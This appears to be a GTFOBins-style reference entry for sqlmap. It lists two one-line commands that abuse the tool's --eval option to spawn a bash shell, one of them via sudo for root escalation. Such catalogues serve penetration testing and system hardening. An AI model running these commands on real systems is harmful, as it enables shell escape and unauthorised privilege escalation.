---
functions:
  shell:
    - code: sqlmap -u 127.0.0.1 --eval="import os;os.system('bash')"
  sudo:
    - code: sudo sqlmap -u 127.0.0.1 --eval="import os;os.system('bash')"
---
